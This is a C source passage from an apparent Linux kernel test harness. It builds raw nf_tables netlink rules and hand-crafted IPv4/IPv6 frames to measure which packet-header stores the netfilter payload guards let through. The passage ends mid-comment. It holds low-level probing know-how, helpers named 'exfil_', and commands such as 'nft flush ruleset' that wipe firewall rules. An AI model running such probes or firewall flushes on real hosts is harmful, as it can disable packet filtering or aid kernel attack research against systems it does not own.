static struct nlmsghdr *f550_newrule_accept_only(const char *table, const char *chain)
{
	struct nlmsghdr *nlh = f542_rule_begin(table, chain);
	struct nlattr *exprs = nest_start(nlh, NFTA_RULE_EXPRESSIONS, "q.exprs");

	exfil_imm_verdict(nlh, NF_ACCEPT);
	nest_end(nlh, exprs);
	nops++;
	return nlh;
}

static void f550_raw_arm(const char *table, const char *chain, const struct f550_raw_arm *a)
{
	unsigned char imm[16];
	unsigned char cap[2048];
	char extra[256], tag[64];
	int errs, nattr = 0, sent = 0, ncap = 0, flen = 0;
	int k, covers;

	for (k = 0; k < 16; k++)
		imm[k] = (unsigned char)(0xa0 + k);
	if (a->bytes)
		memcpy(imm, a->bytes, a->len);

	nops = 0;
	nrecs = 0;
	if (a->len == 0)
		f550_newrule_accept_only(table, chain);
	else
		/* csum type NONE with a non-zero csum offset is -EINVAL in
		 * nft_payload_set_init() ("nonsensical"), so the no-fixup arms
		 * send offset 0 -- the same shape nft sends for @th stores */
		f550_newrule_payload_accept(table, chain, 2 /* transport */, a->off,
					    a->len, a->csum ? 16 : 0, a->csum, imm, 16);
	errs = f543_send_checked(&nattr, &nattr);
	if (errs != 0) {
		printf("F550 B.%s|setup=ERR|errno=%d\n", a->tag, g_err ? -g_err : 0);
		return;
	}
	covers = ((int)a->off <= F550_DOFF_BYTE &&
		  (int)(a->off + a->len) > F550_DOFF_BYTE);
	snprintf(extra, sizeof(extra), "off=%u|len=%u|covers12=%d|csum=%d",
		 a->off, a->len, covers, a->csum);
	snprintf(tag, sizeof(tag), "B.%s", a->tag);
	if (f550_probe(cap, &flen, &sent, &ncap) == 0)
		f550_print(tag, extra, cap, flen, sent, ncap);
	else
		printf("F550 %s|%s|PROBEFAIL\n", tag, extra);
	nops = 0;
	nrecs = 0;
	op_delrule_flush543(table, chain);
	f543_send_checked(&nattr, &nattr);
}

static void f550_raw_section(void)
{
	static const unsigned char b12_same[16] = { 0x50 };	/* the byte already there */
	static const unsigned char b12_res[16]  = { 0x51 };	/* doff kept, one res bit */
	static const unsigned char w12_doff[16] = { 0x60, 0x18 };
	static const unsigned char b13_flags[16] = { 0x02 };
	static const struct f550_raw_arm arms[] = {
		{ "none",        0,  0,  NULL, 1 },	/* verdict only: the control */
		{ "8.1", 8, 1, NULL, 1 },
		{ "8.2", 8, 2, NULL, 1 },
		{ "8.3", 8, 3, NULL, 1 },
		{ "8.4", 8, 4, NULL, 1 },
		{ "8.5", 8, 5, NULL, 1 },
		{ "8.8", 8, 8, NULL, 1 },
		{ "4.8", 4, 8, NULL, 1 },
		{ "9.2", 9, 2, NULL, 1 },
		{ "9.3", 9, 3, NULL, 1 },
		{ "9.4", 9, 4, NULL, 1 },
		{ "10.1", 10, 1, NULL, 1 },
		{ "10.2", 10, 2, NULL, 1 },
		{ "10.3", 10, 3, NULL, 1 },
		{ "10.4", 10, 4, NULL, 1 },
		{ "11.1", 11, 1, NULL, 1 },
		{ "11.2", 11, 2, NULL, 1 },
		{ "11.4", 11, 4, NULL, 1 },
		{ "12.1", 12, 1, NULL, 1 },
		{ "12.2", 12, 2, NULL, 1 },
		{ "12.4", 12, 4, NULL, 1 },
		{ "12.8", 12, 8, NULL, 1 },
		{ "0.16", 0, 16, NULL, 1 },
		{ "5.8", 5, 8, NULL, 1 },
		{ "13.1", 13, 1, NULL, 1 },
		{ "13.2", 13, 2, NULL, 1 },
		{ "14.2", 14, 2, NULL, 1 },
		{ "12.same", 12, 1, b12_same, 1 },
		{ "12.res", 12, 1, b12_res, 1 },
		{ "12.doff", 12, 2, w12_doff, 1 },
		{ "13.flags", 13, 1, b13_flags, 1 },
		{ "cs0.8.4", 8, 4, NULL, 0 },	/* the same store, no csum fixup */
		{ "cs0.13.1", 13, 1, NULL, 0 },
	};
	char tab[32];
	int nattr = 0, errs;
	unsigned int k;

	snprintf(tab, sizeof(tab), "p550_%d", (int)getpid());
	nops = 0;
	nrecs = 0;
	op_newtable(tab);
	op_newchain(tab, "c", NF_INET_FORWARD, 0, NF_DROP);
	errs = f543_send_checked(&nattr, &nattr);
	printf("F550 RAWSETUP|errs=%d|table=%s\n", errs, tab);

	for (k = 0; k < sizeof(arms) / sizeof(arms[0]); k++)
		f550_raw_arm(tab, "c", &arms[k]);

	nops = 0;
	nrecs = 0;
	op_deltable_f540(tab);
	f543_send_checked(&nattr, &nattr);
}

/* ---------- C: does a refused store also skip the verdict? ---------- */

static void f550_verdict_arm(const char *tag, const char *rule)
{
	unsigned char cap[2048];
	char cmd[1024], extra[512];
	int rc, sent = 0, ncap = 0, flen = 0;

	f550_sh("/nft flush chain ip p550v v");
	if (rule) {
		snprintf(cmd, sizeof(cmd), "/nft add rule ip p550v v '%s' counter accept", rule);
		rc = f550_sh(cmd);
	} else {
		rc = 0;
	}
	snprintf(extra, sizeof(extra), "nftrc=%d|rule=%s", rc,
		 rule ? rule : "none");
	if (f550_probe(cap, &flen, &sent, &ncap) != 0) {
		printf("F550 C.%s|%s|PROBEFAIL\n", tag, extra);
		return;
	}
	snprintf(cmd, sizeof(cmd), "C.%s", tag);
	f550_print(cmd, extra, cap, flen, sent, ncap);
	/* the counter is the second half of the answer */
	snprintf(cmd, sizeof(cmd),
		 "/nft list chain ip p550v v 2>&1 | tr -d '\\r' | sed 's/^/F550V %s /'",
		 tag);
	f550_sh(cmd);
}

static void f550_verdict_section(void)
{
	unsigned int k;

	f550_sh("/nft flush ruleset");
	f550_sh("/nft add table ip p550v");
	f550_sh("/nft 'add chain ip p550v v { type filter hook forward priority 0; policy drop; }'");
	f550_verdict_arm("ctl.none", NULL);
	for (k = 0; k < sizeof(f550_nft) / sizeof(f550_nft[0]); k++) {
		if (!f550_nft[k].rule)
			continue;
		f550_verdict_arm(f550_nft[k].tag, f550_nft[k].rule);
	}
	f550_sh("/nft delete table ip p550v");
}

static void run_f550(void)
{
	struct f539_env e;
	char out[512];

	if (f539_env_open(&e, out, sizeof(out)) < 0) {
		printf("F550 SETUP|fail|%s\n", out);
		f539_env_close(&e);
		return;
	}
	f539_route_add("fv0", F539_NET_FAR, 24, 0);
	f539_sysctl("/proc/sys/net/netfilter/nf_conntrack_checksum", "0");
	f550_envp = &e;
	f550_sh("echo \"F550 SYSCTL|cc=$(cat /proc/sys/net/netfilter/nf_conntrack_checksum 2>&1)\"");

	f550_nft_section();
	f550_raw_section();
	f550_verdict_section();

	f550_sh("/nft flush ruleset");
	printf("F550 DONE\n");
	nf_flush();
	f539_env_close(&e);
}

/* differ552_add.c -- turn 552 additions to vm/differ552.c
 *
 * F30: the last two of the four bases a payload store can name.
 *
 * F27/F28 measured the transport guard (nft_th_write_ok) and F29 the inner
 * base.  The network guard (nft_nh_write_ok, dispatch at nft_payload.c:963)
 * and the link guard (nft_ll_write_ok, :986) have never been measured on any
 * kernel.  Both live in the same function, are called from the same three
 * lines of nft_payload_set_eval(), and are written for the same purpose --
 * "a store must not spill into the next header".  They are not the same kind
 * of check:
 *
 *   ll : "end <= skb_network_offset()"                        -- a boundary.
 *   nh : switch (priv->offset) { 0, 1, 4, 8, 10, 12, 16 }     -- a whitelist.
 *
 * A whitelist can kill a store that is perfectly safe, and it does: nft's own
 * `ip6 ecn set` and `ip6 flowlabel set` compile to stores at network offset 1
 * (IPv6 has no header checksum, so nft's "round up to even" rule, which exists
 * for the IPv4 csum fixup, does not fire), and the whitelist has no case 1.
 * The IPv4 twin of the same operator is expanded to 2b @0 by that very rule
 * and survives.
 *
 * What is measured here, and with what answer:
 *
 *   A4  every `ip <field> set` nft 1.1.7 accepts, in an *accept* chain:
 *       nft's --debug=netlink geometry, nft's exit code, and the frame that
 *       arrives on the far side, byte for byte against a control run.
 *   A6  the same for `ip6 <field> set`, over a hand-built Ethernet+IPv6+TCP
 *       frame (IPv6 has no IP ID and no header checksum, so the control frame
 *       is reproducible, which is why this base is measurable at all).
 *   A0  `ether ...` and raw `@ll` stores.  For a *forwarded* packet the L2
 *       header is rebuilt at transmit, so a link store is invisible on the
 *       wire; the oracle here is the verdict only (policy drop + accept
 *       after the store).
 *   B4/B6  the predicate itself, at the netlink level: base=network, offset
 *       0..19 (IPv4) / 0..39 (IPv6), len 1 and 2, in a chain with
 *       `policy drop` and `accept` after the store.  Delivered = the guard
 *       let the store through.  Values keep the bytes the guard compares
 *       (version/ihl at 0, protocol at 9), so what is measured is the offset
 *       rule and not the byte rule; the byte rule gets its own arms.
 *   C4/C6  the consequence for every spelling: `<rule> counter accept` under
 *       `policy drop`.  Counter 0 and no packet = the rule's verdict was
 *       skipped along with the store.
 *
 * Nothing here asks the kernel "did the store work"; the frame and the counter
 * are the only answers it gives.
 */

#include <linux/neighbour.h>

#define F552_V6_PLEN 16

/* uapi enum nft_counter_attributes: UNSPEC, BYTES, PACKETS */
#ifndef NFTA_COUNTER_PACKETS
#define NFTA_COUNTER_PACKETS 2
#endif

/* fam 4/6 -> nfproto for the netlink messages: NFPROTO_IPV4 is 2, not 4 */
/* uapi/linux/netfilter.h: NFPROTO_IPV4 = 2, NFPROTO_IPV6 = 10.  Spelled as
 * numbers because this file reaches the nf_tables uapi without the netfilter
 * family enum. */
#define F552_PF(f) ((f) == 4 ? 2 : 10)

static struct f539_env *f552_envp;

static int f552_sh(const char *cmd)
{
	int rc = system(cmd);

	if (rc < 0)
		return -1;
	return WEXITSTATUS(rc);
}

/* neither address is local to the near side: the frame is routed, not
 * delivered, so it traverses the forward hook */
static const unsigned char f552_v6_src[16] = {
	0xfd, 0, 0, 0x98, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 2
};
static const unsigned char f552_v6_dst[16] = {
	0xfd, 0, 0, 0x99, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 2
};

/* ---------- IPv6 plumbing on the near side ---------- */

static int f552_v6_route(const char *dev)
{
	char buf[512];
	struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
	struct rtmsg *rtm;
	int32_t oif;
	int fd, rc, idx = f539_ifindex(dev);

	if (idx < 0)
		return -50;
	rt_init(nlh, buf, (int)sizeof(buf), RTM_NEWROUTE, sizeof(struct rtmsg));
	nlh->nlmsg_flags = NLM_F_CREATE | NLM_F_REPLACE;
	rtm = (struct rtmsg *)NLMSG_DATA(nlh);
	rtm->rtm_family = AF_INET6;
	rtm->rtm_dst_len = 64;
	rtm->rtm_table = RT_TABLE_MAIN;
	rtm->rtm_protocol = RTPROT_BOOT;
	rtm->rtm_scope = RT_SCOPE_LINK;
	rtm->rtm_type = RTN_UNICAST;
	attr_put(nlh, RTA_DST, f552_v6_dst, 16, NULL);
	oif = idx;
	attr_put(nlh, RTA_OIF, &oif, 4, NULL);
	fd = rtnl_open();
	if (fd < 0)
		return -51;
	rc = rtnl_talk(fd, nlh);
	close(fd);
	return rc;
}

static int f552_v6_neigh(const char *dev, const unsigned char *ip6,
			 const unsigned char *mac)
{
	char buf[512];
	struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
	struct ndmsg *ndm;
	unsigned char ll[6];
	int fd, rc, idx = f539_ifindex(dev);

	if (idx < 0)
		return -60;
	rt_init(nlh, buf, (int)sizeof(buf), RTM_NEWNEIGH, sizeof(struct ndmsg));
	nlh->nlmsg_flags = NLM_F_CREATE | NLM_F_REPLACE;
	ndm = (struct ndmsg *)NLMSG_DATA(nlh);
	ndm->ndm_family = AF_INET6;
	ndm->ndm_ifindex = idx;
	ndm->ndm_state = NUD_PERMANENT;
	ndm->ndm_type = RTN_UNICAST;
	attr_put(nlh, NDA_DST, ip6, 16, NULL);
	memcpy(ll, mac, 6);
	attr_put(nlh, NDA_LLADDR, ll, 6, NULL);
	fd = rtnl_open();
	if (fd < 0)
		return -61;
	rc = rtnl_talk(fd, nlh);
	close(fd);
	return rc;
}

static int f552_v6_setup(void)
{
	int rc = 0;

	rc |= f552_v6_route("fv0");
	rc |= f552_v6_neigh("fv0", f552_v6_dst, f539_mac_far);
	{
		/* `ip6 daddr set` must not make the packet unroutable, or the
		 * accept chain would look identical to a refused store */
		unsigned char d9[16] = { 0xfd, 0, 0, 0x99, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 9 };

		rc |= f552_v6_neigh("fv0", d9, f539_mac_far);
	}
	f539_sysctl("/proc/sys/net/ipv6/conf/all/forwarding", "1");
	f539_sysctl("/proc/sys/net/ipv6/conf/fv0/forwarding", "1");
	f539_sysctl("/proc/sys/net/ipv6/conf/all/disable_ipv6", "0");
	f539_sysctl("/proc/sys/net/ipv6/conf/fv0/disable_ipv6", "0");
	return rc;
}

/* ---------- far side: one hand-built Ethernet+IPv6+TCP frame, read back ---- */

static int f552_peer_v6(int plen, unsigned char *out, int *flen, int *nsent,
			int *ncap)
{
	struct sockaddr_ll sll;
	struct pollfd pfd;
	unsigned char *f, buf[2048];
	int s, i, idx = f539_ifindex("fv1");
	int tot = 14 + 40 + 20 + plen;

	*nsent = 0;
	*ncap = 0;
	*flen = 0;
	if (idx < 0 || plen < 0 || plen > 600)
		return 41;
	s = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
	if (s < 0)
		return 42;
	f = calloc(1, (size_t)tot);
	if (!f) {
		close(s);
		return 43;
	}
	memset(&sll, 0, sizeof(sll));
	sll.sll_family = AF_PACKET;
	sll.sll_protocol = htons(ETH_P_IPV6);
	sll.sll_ifindex = idx;
	sll.sll_halen = 6;
	memcpy(sll.sll_addr, f539_mac_me, 6);

	/* drain anything already queued (nd/ra chatter of a fresh veth) */
	while (recv(s, buf, sizeof(buf), MSG_DONTWAIT) > 0)
		;

	memcpy(f, f539_mac_me, 6);
	memcpy(f + 6, f539_mac_far, 6);
	f[12] = 0x86;
	f[13] = 0xdd;
	{
		unsigned char *ip6 = f + 14;
		unsigned char *tcp = f + 54;

		memset(ip6, 0, 40);
		ip6[0] = 0x60;			/* version 6, tc 0          */
		ip6[1] = 0x01;			/* flow label 0x12345       */
		ip6[2] = 0x23;
		ip6[3] = 0x45;
		ip6[4] = 0x00;
		ip6[5] = (unsigned char)(20 + plen);
		ip6[6] = IPPROTO_TCP;
		ip6[7] = 64;			/* hop limit                */
		memcpy(ip6 + 8, f552_v6_src, 16);
		memcpy(ip6 + 24, f552_v6_dst, 16);

		memset(tcp, 0, (size_t)(20 + plen));
		tcp[0] = 0x9c;			/* sport 40000              */
		tcp[1] = 0x40;
		tcp[2] = 0x27;			/* dport 9999               */
		tcp[3] = 0x0f;
		tcp[4] = 0x11;			/* seq 0x11223344           */
		tcp[5] = 0x22;
		tcp[6] = 0x33;
		tcp[7] = 0x44;
		tcp[12] = 0x50;			/* doff 5                   */
		tcp[13] = 0x02;			/* SYN                      */
		tcp[14] = 0xff;
		tcp[15] = 0xff;
		/* checksum 0: a forwarded packet is not checksum-verified */
		memset(tcp + 20, 0x77, (size_t)plen);
	}

	if (sendto(s, f, (size_t)tot, 0, (struct sockaddr *)&sll, sizeof(sll)) >= 0)
		(*nsent)++;

	pfd.fd = s;
	pfd.events = POLLIN;
	for (i = 0; i < 40; i++) {
		struct sockaddr_ll from;
		socklen_t fl = sizeof(from);
		ssize_t r;

		if (*ncap > 0)
			break;
		if (poll(&pfd, 1, 10) <= 0)
			continue;
		r = recvfrom(s, buf, sizeof(buf), MSG_DONTWAIT,
			     (struct sockaddr *)&from, &fl);
		if (r < 54)
			continue;
		if (from.sll_pkttype == PACKET_OUTGOING)
			continue;
		if (buf[12] != 0x86 || buf[13] != 0xdd)
			continue;
		if (memcmp(buf, f539_mac_far, 6))
			continue;
		memcpy(out, buf, (size_t)r);
		*flen = (int)r;
		(*ncap)++;
	}
	free(f);
	close(s);
	return 0;
}

/* the same reply protocol as the 'Z' probe: "D <sent> <cap> <flen> [hex]",
 * and a dropped packet is a normal outcome, not a failure -- so three fields
 * are enough (the same sscanf floor f543_probe_request uses). */
static int f552_p6(int *nsent, int *ncap, unsigned char *fr, int *flen)
{
	char req[64], line[2048], hex[1024];
	unsigned int a = 0, b = 0, nc = 0;
	int i;

	snprintf(req, sizeof(req), "V %d\n", F552_V6_PLEN);
	if (f539_write_all(f552_envp->cmd, req, (int)strlen(req)) < 0)
		return -1;
	if (f539_read_line(f552_envp->ack, line, sizeof(line), 8000) < 0)
		return -2;
	memset(hex, 0, sizeof(hex));
	if (sscanf(line + 1, "%u %u %u %1000s", &a, &b, &nc, hex) < 3)
		return -3;
	*nsent = (int)a;
	*ncap = (int)b;
	*flen = 0;
	for (i = 0; i < (int)nc && i < 400 && hex[2 * i] && hex[2 * i + 1]; i++) {
		unsigned int v = 0;

		sscanf(hex + 2 * i, "%2x", &v);
		fr[i] = (unsigned char)v;
		*flen = i + 1;
	}
	return 0;
}

/* ---------- one report line: the frame against the control ---------- */

static void f552_report(const char *tag, const char *rule,
			const unsigned char *cap, int flen, int sent, int ncap,
			const unsigned char *ctl, int clen)
{
	char chg[768];
	int i, nchg = 0;

	chg[0] = 0;
	if (ncap == 1 && ctl && clen > 0) {
		for (i = 0; i < flen && i < clen; i++) {
			size_t at;

			if (cap[i] == ctl[i])
				continue;
			nchg++;
			at = strlen(chg);
			if (at < sizeof(chg) - 24)
				snprintf(chg + at, sizeof(chg) - at, "%s%d:%02x>%02x",
					 nchg > 1 ? "," : "", i, ctl[i], cap[i]);
		}
	}
	printf("F552 %s|rule=%s|sent=%d|cap=%d|flen=%d|nchg=%d|chg=%s|hex=",
	       tag, rule ? rule : "none", sent, ncap, flen, nchg, chg);
	for (i = 0; i < flen && i < 400; i++)
		printf("%02x", cap[i]);
	printf("\n");
}

/* ---------- nft-driven arms: one list of spellings, two families ---------- */

struct f552_spell {
	const char *tag;
	const char *rule;	/* NULL = the control run */
};

static const struct f552_spell f552_ip4[] = {
	{ "ctl.none",        NULL },
	{ "ip.dscp",         "ip dscp set 0x2e" },
	{ "ip.ecn",          "ip ecn set 1" },
	{ "ip.id",           "ip id set 0x1234" },
	{ "ip.ttl",          "ip ttl set 61" },
	{ "ip.checksum",     "ip checksum set 0x1234" },
	{ "ip.saddr",        "ip saddr set 10.9.0.7" },
	{ "ip.version4",     "ip version set 4" },
	{ "ip.version6",     "ip version set 6" },
	{ "ip.hdrlength5",   "ip hdrlength set 5" },
	{ "ip.hdrlength6",   "ip hdrlength set 6" },
	{ "ip.length",       "ip length set 0x0030" },
	{ "ip.fragoff",      "ip frag-off set 0x4000" },
	{ "ip.protocol",     "ip protocol set 17" },
};

static const struct f552_spell f552_ip6[] = {
	{ "ctl.none",        NULL },
	{ "ip6.dscp",        "ip6 dscp set 0x2e" },
	{ "ip6.ecn",         "ip6 ecn set 1" },
	{ "ip6.flowlabel",   "ip6 flowlabel set 0x54321" },
	{ "ip6.hoplimit",    "ip6 hoplimit set 61" },
	{ "ip6.saddr",       "ip6 saddr set fd00:98::7" },
	{ "ip6.daddr",       "ip6 daddr set fd00:99::9" },
	{ "ip6.version6",    "ip6 version set 6" },
	{ "ip6.version5",    "ip6 version set 5" },
	{ "ip6.length",      "ip6 length set 0x0030" },
	{ "ip6.nexthdr",     "ip6 nexthdr set 17" },
};

static const struct f552_spell f552_ll[] = {
	{ "ctl.none",        NULL },
	{ "ll.saddr",        "ether saddr set aa:bb:cc:dd:ee:07" },
	{ "ll.daddr",        "ether daddr set aa:bb:cc:dd:ee:08" },
	{ "ll.type",         "ether type set 0x0806" },
	{ "ll.raw0",         "@ll,0,16 set 0x8899" },
	{ "ll.raw96",        "@ll,96,16 set 0x0806" },
	{ "ll.raw112",       "@ll,112,8 set 0x45" },
	{ "ll.raw0_128",     "@ll,0,128 set 0x112233445566778899aabbccddeeff50" },
};

/* A4/A6: an accept chain, so the frame *is* the answer */
static void f552_nft_section(const char *fam, const struct f552_spell *arms,
			     int n, int v6)
{
	unsigned char cap[512], ctl[512];
	char cmd[1024], tag[64];
	int k, ctl_len = 0, sent = 0, ncap = 0, flen = 0, rc;

	f552_sh("/nft flush ruleset");
	snprintf(cmd, sizeof(cmd), "/nft add table %s p552", fam);
	f552_sh(cmd);
	snprintf(cmd, sizeof(cmd),
		 "/nft 'add chain %s p552 c { type filter hook forward priority 0; policy accept; }'",
		 fam);
	rc = f552_sh(cmd);
	printf("F552 SETUP.%s|rc=%d|hook=forward|policy=accept\n", fam, rc);

	for (k = 0; k < n; k++) {
		snprintf(cmd, sizeof(cmd), "/nft flush chain %s p552 c", fam);
		f552_sh(cmd);
		if (arms[k].rule) {
			snprintf(cmd, sizeof(cmd),
				 "/nft --debug=netlink add rule %s p552 c '%s counter' "
				 ">/tmp/f552nl 2>&1; echo \"F552RC %s.%s $?\"",
				 fam, arms[k].rule, fam, arms[k].tag);
			f552_sh(cmd);
			snprintf(cmd, sizeof(cmd),
				 "sed 's/^/F552NL %s.%s /' /tmp/f552nl", fam, arms[k].tag);
			f552_sh(cmd);
		} else {
			printf("F552RC %s.%s 0\n", fam, arms[k].tag);
		}
		memset(cap, 0, sizeof(cap));
		flen = 0;
		ncap = 0;
		sent = 0;
		if (v6)
			rc = f552_p6(&sent, &ncap, cap, &flen);
		else
			rc = f543_probe_request(f552_envp, 16, 0x50, 0x18, &sent,
						&ncap, cap, &flen);
		if (!arms[k].rule && rc == 0 && ncap == 1) {
			memcpy(ctl, cap, sizeof(ctl));
			ctl_len = flen;
		}
		snprintf(tag, sizeof(tag), "%s.%s", fam, arms[k].tag);
		if (rc != 0 || ncap != 1) {
			printf("F552 %s|rule=%s|sent=%d|cap=%d|PROBEFAIL\n",
			       tag, arms[k].rule ? arms[k].rule : "none", sent, ncap);
			continue;
		}
		f552_report(tag, arms[k].rule, cap, flen, sent, ncap, ctl, ctl_len);
		snprintf(cmd, sizeof(cmd),
			 "/nft list chain %s p552 c 2>&1 | tr -d '\\r' | sed 's/^/F552CA %s /'",
			 fam, tag);
		f552_sh(cmd);
	}
	f552_sh("/nft flush ruleset");
}

/* A0: the link base -- the L2 header of a forwarded packet is rebuilt at
 * transmit, so the byte is not the answer; the verdict is. */
static void f552_ll_section(void)
{
	char cmd[1024], tag[64];
	int k, rc, sent = 0, ncap = 0, flen = 0;
	unsigned char cap[512];

	f552_sh("/nft flush ruleset");
	f552_sh("/nft add table ip p552ll");
	f552_sh("/nft 'add chain ip p552ll v { type filter hook forward priority 0; policy drop; }'");
	for (k = 0; k < (int)(sizeof(f552_ll) / sizeof(f552_ll[0])); k++) {
		f552_sh("/nft flush chain ip p552ll v");
		if (f552_ll[k].rule) {
			snprintf(cmd, sizeof(cmd),
				 "/nft --debug=netlink add rule ip p552ll v '%s' counter accept "
				 ">/tmp/f552nl 2>&1; echo \"F552RC ll.%s $?\"",
				 f552_ll[k].rule, f552_ll[k].tag);
			f552_sh(cmd);
			snprintf(cmd, sizeof(cmd),
				 "sed 's/^/F552NL ll.%s /' /tmp/f552nl", f552_ll[k].tag);
			f552_sh(cmd);
		} else {
			printf("F552RC ll.%s 0\n", f552_ll[k].tag);
		}
		memset(cap, 0, sizeof(cap));
		flen = 0;
		ncap = 0;
		sent = 0;
		rc = f543_probe_request(f552_envp, 16, 0x50, 0x18, &sent, &ncap,
					cap, &flen);
		snprintf(tag, sizeof(tag), "ll.%s", f552_ll[k].tag);
		printf("F552 %s|rule=%s|sent=%d|cap=%d|flen=%d|deliv=%d\n",
		       tag, f552_ll[k].rule ? f552_ll[k].rule : "none",
		       sent, ncap, flen, rc == 0 && ncap == 1);
		snprintf(cmd, sizeof(cmd),
			 "/nft list chain ip p552ll v 2>&1 | tr -d '\\r' | sed 's/^/F552V %s /'",
			 tag);
		f552_sh(cmd);
	}
	f552_sh("/nft flush ruleset");
}

/* ---------- B: the predicate, at the netlink level ---------- */

static struct nlmsghdr *f552_newrule_store(int family, const char *table,
					   const char *chain, uint32_t base,
					   uint32_t off, uint32_t len,
					   uint32_t csum_type, uint32_t csum_off,
					   const unsigned char *imm, int immlen,
					   int verdict)
{
	struct nlmsghdr *nlh;
	struct nlattr *exprs, *e, *d;

	cur_op = nops;
	nlh = msg_start(opbuf[nops],
			(NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_NEWRULE,
			NLM_F_REQUEST | NLM_F_ACK | NLM_F_CREATE | NLM_F_APPEND,
			F552_PF(family));
	put_str(nlh, NFTA_RULE_TABLE, table, "f30.rule.table");
	put_str(nlh, NFTA_RULE_CHAIN, chain, "f30.rule.chain");
	exprs = nest_start(nlh, NFTA_RULE_EXPRESSIONS, "f30.exprs");

	exfil_imm_value(nlh, NFT_REG32_00, imm, immlen);
	e = nest_start(nlh, NFTA_LIST_ELEM, "f30.elem");
	put_str(nlh, NFTA_EXPR_NAME, "payload", "f30.name");
	d = nest_start(nlh, NFTA_EXPR_DATA, "f30.data");
	put_be32(nlh, NFTA_PAYLOAD_SREG, NFT_REG32_00, "f30.sreg");
	put_be32(nlh, NFTA_PAYLOAD_BASE, base, "f30.base");
	put_be32(nlh, NFTA_PAYLOAD_OFFSET, off, "f30.offset");
	put_be32(nlh, NFTA_PAYLOAD_LEN, len, "f30.len");
	put_be32(nlh, NFTA_PAYLOAD_CSUM_TYPE, csum_type, "f30.csum_type");
	put_be32(nlh, NFTA_PAYLOAD_CSUM_OFFSET, csum_off, "f30.csum_off");
	nest_end(nlh, d);
	nest_end(nlh, e);
	/* a counter between the store and the verdict is the second oracle:
	 * NFT_BREAK skips the rest of the rule, so packets 0 means "the guard
	 * refused" even when the packet would have been lost afterwards for a
	 * routing reason (a rewritten destination address). */
	if (verdict) {
		e = nest_start(nlh, NFTA_LIST_ELEM, "f30.cnt");
		put_str(nlh, NFTA_EXPR_NAME, "counter", "f30.cnt.name");
		d = nest_start(nlh, NFTA_EXPR_DATA, "f30.cnt.data");
		nest_end(nlh, d);
		nest_end(nlh, e);
		exfil_imm_verdict(nlh, NF_ACCEPT);
	}
	nest_end(nlh, exprs);
	nops++;
	return nlh;
}

static struct nlmsghdr *f552_newrule_accept(int family, const char *table,
					    const char *chain)
{
	struct nlmsghdr *nlh;
	struct nlattr *exprs;

	cur_op = nops;
	nlh = msg_start(opbuf[nops],
			(NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_NEWRULE,
			NLM_F_REQUEST | NLM_F_ACK | NLM_F_CREATE | NLM_F_APPEND,
			F552_PF(family));
	put_str(nlh, NFTA_RULE_TABLE, table, "f30.v.table");
	put_str(nlh, NFTA_RULE_CHAIN, chain, "f30.v.chain");
	exprs = nest_start(nlh, NFTA_RULE_EXPRESSIONS, "f30.v.exprs");
	exfil_imm_verdict(nlh, NF_ACCEPT);
	nest_end(nlh, exprs);
	nops++;
	return nlh;
}

static struct nlmsghdr *f552_newtable(int family, const char *table)
{
	struct nlmsghdr *nlh;

	cur_op = nops;
	nlh = msg_start(opbuf[nops],
			(NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_NEWTABLE,
			NLM_F_REQUEST | NLM_F_ACK | NLM_F_CREATE | NLM_F_EXCL,
			F552_PF(family));
	put_str(nlh, NFTA_TABLE_NAME, table, "f30.table.name");
	nops++;
	return nlh;
}

static struct nlmsghdr *f552_newchain(int family, const char *table,
				      const char *chain, int hooknum,
				      int priority, uint32_t policy)
{
	struct nlmsghdr *nlh;
	struct nlattr *hook;

	cur_op = nops;
	nlh = msg_start(opbuf[nops],
			(NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_NEWCHAIN,
			NLM_F_REQUEST | NLM_F_ACK | NLM_F_CREATE | NLM_F_EXCL,
			F552_PF(family));
	put_str(nlh, NFTA_CHAIN_TABLE, table, "f30.chain.table");
	put_str(nlh, NFTA_CHAIN_NAME, chain, "f30.chain.name");
	put_str(nlh, NFTA_CHAIN_TYPE, "filter", "f30.chain.type");
	put_be32(nlh, NFTA_CHAIN_POLICY, policy, "f30.chain.policy");
	hook = nest_start(nlh, NFTA_CHAIN_HOOK, "f30.chain.hook");
	put_be32(nlh, NFTA_HOOK_HOOKNUM, (uint32_t)hooknum, "f30.chain.hooknum");
	put_be32(nlh, NFTA_HOOK_PRIORITY, (uint32_t)priority, "f30.chain.prio");
	nest_end(nlh, hook);
	nops++;
	return nlh;
}

static struct nlmsghdr *f552_deltable(int family, const char *table)
{
	struct nlmsghdr *nlh;

	cur_op = nops;
	nlh = msg_start(opbuf[nops],
			(NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_DELTABLE,
			NLM_F_REQUEST | NLM_F_ACK, F552_PF(family));
	put_str(nlh, NFTA_TABLE_NAME, table, "f30.del.table");
	nops++;
	return nlh;
}

static void f552_flush_chain(int family, const char *table, const char *chain)
{
	struct nlmsghdr *nlh;
	int nattr = 0;

	cur_op = nops;
	nlh = msg_start(opbuf[nops],
			(NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_DELRULE,
			NLM_F_REQUEST | NLM_F_ACK, F552_PF(family));
	put_str(nlh, NFTA_RULE_TABLE, table, "f30.f.table");
	put_str(nlh, NFTA_RULE_CHAIN, chain, "f30.f.chain");
	nops++;
	f543_send_checked(&nattr, &nattr);
	nops = 0;
	nrecs = 0;
}

/* the immediate keeps the bytes the guard compares, so the arm measures the
 * offset rule and not the byte rule */
static void f552_imm_for(int fam, uint32_t off, uint32_t len, unsigned char *imm)
{
	int k;

	for (k = 0; k < 16; k++)
		imm[k] = (unsigned char)(0xa0 + k);
	if (fam == 4) {
		if (off == 0 && len >= 1)
			imm[0] = 0x45;			/* version 4, ihl 5 */
		if (off <= 9 && off + len > 9)
			imm[9 - off] = 0x06;		/* keep the protocol */
	} else {
		if (off == 0 && len >= 1)
			imm[0] = 0x61;			/* version 6        */
	}
}


/* ---------- reading the counter back, without nft's printer ----------
 * nft 1.1.7 aborts on a 4-byte store into ip daddr (its printer resolves the
 * payload to `ip daddr set <16-byte constant>` and asserts), so the counter
 * for exactly the arms that rewrite the destination cannot be read through
